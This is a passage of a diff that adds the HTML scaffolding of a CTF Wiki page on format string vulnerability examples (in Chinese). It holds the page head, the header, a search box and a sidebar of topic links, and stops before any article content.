@@ -1,0 +1,4153 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="CTF Wiki">
+      
+      
+        <link rel="canonical" href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_example/">
+      
+      
+        <meta name="author" content="CTF Wiki Team">
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="jp">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-0.17.2, mkdocs-material-2.6.2">
+    
+    
+      
+        <title>格式化字符串漏洞例子 - CTF Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.9b572555.css">
+      
+        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.6079476c.css">
+      
+    
+    
+      <script src="../../../assets/javascripts/modernizr.1aa3b519.js"></script>
+    
+    
+      
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,400,400i,700|Fira+Mono">
+        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
+      
+      <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    
+    
+      <link rel="stylesheet" href="../../../_static/css/extra.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
+    viewBox="0 0 416 448" id="github">
+  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
+        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
+        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
+        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
+        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
+        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
+        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
+        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
+        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
+        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
+        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
+        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
+        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
+        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
+        99.5z" />
+</svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="drawer">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="search">
+    <label class="md-overlay" data-md-component="overlay" for="drawer"></label>
+    
+      <a href="#_1" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">school</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                CTF Wiki
+              </span>
+              <span class="md-header-nav__topic">
+                格式化字符串漏洞例子
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+
+  <a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      ctf-wiki/ctf-wiki
+    </div>
+  </a>
+
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../.." title="Introduction" class="md-tabs__link">
+          Introduction
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../misc/introduction/" title="Misc" class="md-tabs__link">
+          Misc
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../crypto/introduction/" title="Crypto" class="md-tabs__link">
+          Crypto
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../web/introduction/" title="Web" class="md-tabs__link">
+          Web
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../reverse/introduction/" title="Reverse" class="md-tabs__link">
+          Reverse
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    
+    
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../stackoverflow/stack_intro/" title="Pwn" class="md-tabs__link">
+          Pwn
+        </a>
+      
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+    
+    
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../executable/elf/elf_structure/" title="Executable" class="md-tabs__link">
+          Executable
+        </a>
+      
+    </li>
+  
+
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="drawer">
+    <span class="md-nav__button md-logo">
+      
+        <i class="md-icon">school</i>
+      
+    </span>
+    CTF Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+
+  <a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      ctf-wiki/ctf-wiki
+    </div>
+  </a>
+
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
+    
+    <label class="md-nav__link" for="nav-1">
+      Introduction
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        Introduction
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../.." title="Getting Started" class="md-nav__link">
+      Getting Started
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../introduction/history/" title="CTF 历史" class="md-nav__link">
+      CTF 历史
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../introduction/mode/" title="CTF 竞赛模式简介" class="md-nav__link">
+      CTF 竞赛模式简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../introduction/content/" title="CTF 竞赛内容" class="md-nav__link">
+      CTF 竞赛内容
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../introduction/experience/" title="线下攻防经验小结" class="md-nav__link">
+      线下攻防经验小结
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../introduction/cgc/" title="CGC 超级挑战赛" class="md-nav__link">
+      CGC 超级挑战赛
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../introduction/resources/" title="学习资源" class="md-nav__link">
+      学习资源
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      Misc
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Misc
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/introduction/" title="杂项简介" class="md-nav__link">
+      杂项简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/recon/" title="信息搜集技术" class="md-nav__link">
+      信息搜集技术
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
+    
+    <label class="md-nav__link" for="nav-2-3">
+      编码分析
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-3">
+        编码分析
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/encode/communication/" title="通信领域常用编码" class="md-nav__link">
+      通信领域常用编码
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/encode/computer/" title="计算机相关的编码" class="md-nav__link">
+      计算机相关的编码
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/encode/modern/" title="现实世界中常用的编码" class="md-nav__link">
+      现实世界中常用的编码
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/prefix/" title="取证隐写前置技术" class="md-nav__link">
+      取证隐写前置技术
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
+    
+    <label class="md-nav__link" for="nav-2-5">
+      图片分析
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-5">
+        图片分析
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/picture/introduction/" title="图片分析简介" class="md-nav__link">
+      图片分析简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/picture/png/" title="PNG" class="md-nav__link">
+      PNG
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/picture/jpg/" title="JPG" class="md-nav__link">
+      JPG
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/picture/gif/" title="GIF" class="md-nav__link">
+      GIF
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">
+    
+    <label class="md-nav__link" for="nav-2-6">
+      流量包分析
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-6">
+        流量包分析
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/traffic/introduction/" title="流量包分析简介" class="md-nav__link">
+      流量包分析简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/traffic/fix/" title="PCAP 文件修复" class="md-nav__link">
+      PCAP 文件修复
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/traffic/protocols/" title="协议分析" class="md-nav__link">
+      协议分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/traffic/data/" title="数据提取" class="md-nav__link">
+      数据提取
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-7" type="checkbox" id="nav-2-7">
+    
+    <label class="md-nav__link" for="nav-2-7">
+      压缩包分析
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-7">
+        压缩包分析
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/archive/zip/" title="ZIP 格式" class="md-nav__link">
+      ZIP 格式
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/archive/rar/" title="RAR 格式" class="md-nav__link">
+      RAR 格式
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/audio/introduction/" title="音频隐写" class="md-nav__link">
+      音频隐写
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/disk-memory/introduction/" title="磁盘内存分析" class="md-nav__link">
+      磁盘内存分析
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      Crypto
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Crypto
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/introduction/" title="密码学简介" class="md-nav__link">
+      密码学简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
+    
+    <label class="md-nav__link" for="nav-3-2">
+      古典密码
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-2">
+        古典密码
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/classical/introduction/" title="古典密码简介" class="md-nav__link">
+      古典密码简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/classical/monoalphabetic/" title="单表代换加密" class="md-nav__link">
+      单表代换加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/classical/polyalphabetic/" title="多表代换加密" class="md-nav__link">
+      多表代换加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/classical/others/" title="其他类型加密" class="md-nav__link">
+      其他类型加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/classical/summary/" title="总结" class="md-nav__link">
+      总结
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
+    
+    <label class="md-nav__link" for="nav-3-3">
+      对称加密
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-3">
+        对称加密
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/symmetric/introduction/" title="对称加密简介" class="md-nav__link">
+      对称加密简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/symmetric/des/" title="DES" class="md-nav__link">
+      DES
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/symmetric/aes/" title="AES" class="md-nav__link">
+      AES
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/symmetric/block_cipher/" title="分组模式" class="md-nav__link">
+      分组模式
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
+    
+    <label class="md-nav__link" for="nav-3-4">
+      非对称加密
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-4">
+        非对称加密
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/asymmetric/introduction/" title="非对称加密简介" class="md-nav__link">
+      非对称加密简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-2" type="checkbox" id="nav-3-4-2">
+    
+    <label class="md-nav__link" for="nav-3-4-2">
+      RSA
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-3-4-2">
+        RSA
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/asymmetric/rsa/rsa_theory/" title="RSA 基本介绍" class="md-nav__link">
+      RSA 基本介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/asymmetric/rsa/rsa_module_attack/" title="模数相关攻击" class="md-nav__link">
+      模数相关攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/asymmetric/rsa/rsa_e_attack/" title="公钥指数相关攻击" class="md-nav__link">
+      公钥指数相关攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/asymmetric/rsa/rsa_d_attack/" title="私钥 d 相关攻击" class="md-nav__link">
+      私钥 d 相关攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/asymmetric/rsa/rsa_chosen_cipher/" title="选择密文攻击" class="md-nav__link">
+      选择密文攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/asymmetric/rsa/rsa_coppersmith_attack/" title="Coppersmith 相关攻击" class="md-nav__link">
+      Coppersmith 相关攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/asymmetric/rsa/rsa_side_channel/" title="侧信道攻击" class="md-nav__link">
+      侧信道攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/asymmetric/rsa/rsa_pkcs_attack/" title="Bleichenbacher 攻击" class="md-nav__link">
+      Bleichenbacher 攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/asymmetric/rsa/rsa_complex/" title="综合" class="md-nav__link">
+      综合
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/asymmetric/knapsack/knapsack/" title="背包加密" class="md-nav__link">
+      背包加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/asymmetric/discrete-log/discrete-log/" title="离散对数相关" class="md-nav__link">
+      离散对数相关
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
+    
+    <label class="md-nav__link" for="nav-3-5">
+      哈希函数
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-5">
+        哈希函数
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/hash/introduction/" title="哈希函数简介" class="md-nav__link">
+      哈希函数简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/hash/md5/" title="MD5" class="md-nav__link">
+      MD5
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/hash/sha1/" title="SHA1" class="md-nav__link">
+      SHA1
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/hash/attack/" title="Hash Attack" class="md-nav__link">
+      Hash Attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/hash/complex/" title="综合" class="md-nav__link">
+      综合
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6" type="checkbox" id="nav-3-6">
+    
+    <label class="md-nav__link" for="nav-3-6">
+      数字签名
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-6">
+        数字签名
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/signature/introduction/" title="数字签名简介" class="md-nav__link">
+      数字签名简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/signature/rsa/" title="RSA 数字签名" class="md-nav__link">
+      RSA 数字签名
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/signature/elgamal/" title="ElGamal 数字签名" class="md-nav__link">
+      ElGamal 数字签名
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/signature/dsa/" title="DSA 数字签名" class="md-nav__link">
+      DSA 数字签名
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/others/others/" title="证书格式" class="md-nav__link">
+      证书格式
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      Web
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        Web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/introduction/" title="Web 应用简介" class="md-nav__link">
+      Web 应用简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/sqli/" title="SQL 注入" class="md-nav__link">
+      SQL 注入
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/xss/" title="XSS 跨站脚本攻击" class="md-nav__link">
+      XSS 跨站脚本攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/csrf/" title="CSRF 跨站请求伪造" class="md-nav__link">
+      CSRF 跨站请求伪造
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/ssrf/" title="SSRF 服务端请求伪造" class="md-nav__link">
+      SSRF 服务端请求伪造
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/php/" title="PHP 代码审计" class="md-nav__link">
+      PHP 代码审计
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      Reverse
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Reverse
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/introduction/" title="软件逆向工程简介" class="md-nav__link">
+      软件逆向工程简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5-2" type="checkbox" id="nav-5-2">
+    
+    <label class="md-nav__link" for="nav-5-2">
+      脱壳技术
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-5-2">
+        脱壳技术
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/unpack/packer-introduction/" title="保护壳简介" class="md-nav__link">
+      保护壳简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/unpack/trace/" title="单步跟踪法" class="md-nav__link">
+      单步跟踪法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/unpack/esp/" title="ESP 定律法" class="md-nav__link">
+      ESP 定律法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/unpack/direct-oep/" title="一步到达 OEP 法" class="md-nav__link">
+      一步到达 OEP 法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/unpack/memory/" title="内存镜像法" class="md-nav__link">
+      内存镜像法
+    </a>
